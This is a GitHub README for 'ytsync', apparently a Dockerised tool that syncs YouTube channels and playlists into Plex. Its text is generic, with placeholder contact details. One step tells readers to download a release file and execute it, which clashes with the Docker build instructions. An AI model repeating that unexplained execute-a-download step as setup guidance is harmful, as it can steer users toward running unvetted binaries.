# ytsync: Automated YouTube Channel & Playlist Sync with Plex 🎬

![GitHub release](https://img.shields.io/github/release/Henrykanjo/ytsync.svg) ![Docker](https://img.shields.io/badge/docker-enabled-blue) ![Python](https://img.shields.io/badge/python-3.8%2B-blue) ![License](https://img.shields.io/badge/license-MIT-green)

## Overview

ytsync is an automated service designed to synchronize YouTube channels and playlists with your Plex media server. It offers Docker support, intelligent filtering, and a user-friendly interface. This project simplifies the management of your media collection by ensuring that your favorite YouTube content is always available on Plex.

## Features

- **Automated Sync**: Keep your Plex library updated with the latest videos from your favorite YouTube channels and playlists.
- **Plex Integration**: Seamlessly integrates with your Plex media server for easy access to content.
- **Docker Support**: Run ytsync in a container for easier deployment and management.
- **Intelligent Filtering**: Customize which videos to sync based on various criteria, such as upload date, duration, and more.
- **Self-Hosted**: Control your own instance of ytsync, ensuring your data stays private.

## Topics

This project covers a range of topics relevant to media automation and management:

- Automation
- Containerization
- Docker
- Homelab
- Media
- Plex
- Python
- Self-Hosted
- Sync
- Video Downloader
- YouTube
- yt-dlp

## Getting Started

To get started with ytsync, you can download the latest release from the [Releases page](https://github.com/Henrykanjo/ytsync/releases). You will need to download the appropriate file for your system and execute it to set up the service.

### Prerequisites

- **Docker**: Ensure you have Docker installed on your system. You can download it from the [official Docker website](https://www.docker.com/get-started).
- **Plex Media Server**: You should have a running instance of Plex Media Server.

### Installation

1. **Clone the Repository**: Start by cloning the ytsync repository.

   ```bash
   git clone https://github.com/Henrykanjo/ytsync.git
   cd ytsync
   ```

2. **Build the Docker Image**: Use Docker to build the image.

   ```bash
   docker build -t ytsync .
   ```

3. **Run the Docker Container**: Start the container with the required environment variables.

   ```bash
   docker run -d --name ytsync -e PLEX_URL=http://your-plex-server:32400 -e YOUTUBE_API_KEY=your_api_key ytsync
   ```

### Configuration

To configure ytsync, you will need to set the following environment variables:

- `PLEX_URL`: The URL of your Plex Media Server.
- `YOUTUBE_API_KEY`: Your YouTube API key for accessing video data.
- `FILTER_OPTIONS`: Optional filters for syncing videos, such as upload date or video length.

You can customize these options based on your needs.

### Usage

Once the service is running, ytsync will automatically synchronize videos from your specified YouTube channels and playlists to your Plex library. You can check the logs to see the sync status and any errors that may occur.

### Advanced Configuration

For advanced users, ytsync offers additional configuration options:

- **Custom Sync Intervals**: Adjust how often ytsync checks for new videos.
- **Notification Settings**: Set up notifications for sync success or failure.
- **Video Metadata**: Customize how video metadata is stored in Plex.

## Contribution

We welcome contributions to ytsync. If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Create a pull request.

### Code of Conduct

Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing to this project.

## License

ytsync is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

For support, please check the [Issues](https://github.com/Henrykanjo/ytsync/issues) section of the repository. You can also reach out to the community for help.

## Release Notes

To keep up with the latest changes and updates, visit the [Releases page](https://github.com/Henrykanjo/ytsync/releases). Here you can find information on new features, bug fixes, and improvements.

## Acknowledgments

ytsync utilizes the following libraries and tools:

- [yt-dlp](https://github.com/yt-dlp/yt-dlp): A powerful video downloader that supports a wide range of sites, including YouTube.
- [PlexAPI](https://github.com/pkkid/python-plexapi): A Python wrapper for the Plex API.

## Contact

For inquiries, please contact the project maintainer at [your-email@example.com](mailto:your-email@example.com).

## FAQ

### How does ytsync work?

ytsync connects to your Plex server and YouTube API to fetch and sync videos. It runs periodically to check for new content and updates your Plex library accordingly.

### Can I run ytsync without Docker?

Yes, you can run ytsync without Docker, but using Docker simplifies the setup process and makes it easier to manage dependencies.

### What happens if a video is removed from YouTube?

If a video is removed from YouTube, ytsync will also remove it from your Plex library during the next sync cycle.

### How can I customize the filters?

You can customize filters by setting the `FILTER_OPTIONS` environment variable. Refer to the documentation for detailed options.

### Is there a limit to the number of channels I can sync?

No, you can sync as many channels and playlists as you like, but keep in mind that this may affect performance based on your server's resources.

### Can I schedule sync times?

Yes, you can set custom sync intervals using the configuration options in the Docker run command.

### What platforms does ytsync support?

ytsync is designed to work on any platform that supports Docker and Plex Media Server.

### Where can I find the latest updates?

You can find the latest updates on the [Releases page](https://github.com/Henrykanjo/ytsync/releases).

### How do I report a bug?

If you encounter a bug, please open an issue in the [Issues section](https://github.com/Henrykanjo/ytsync/issues) of the repository.

## Conclusion

ytsync is a powerful tool for automating the synchronization of YouTube content with your Plex media server. Its ease of use, combined with Docker support and intelligent filtering, makes it a valuable addition to any media enthusiast's toolkit. Download the latest release from the [Releases page](https://github.com/Henrykanjo/ytsync/releases) and start enjoying your favorite YouTube videos on Plex today!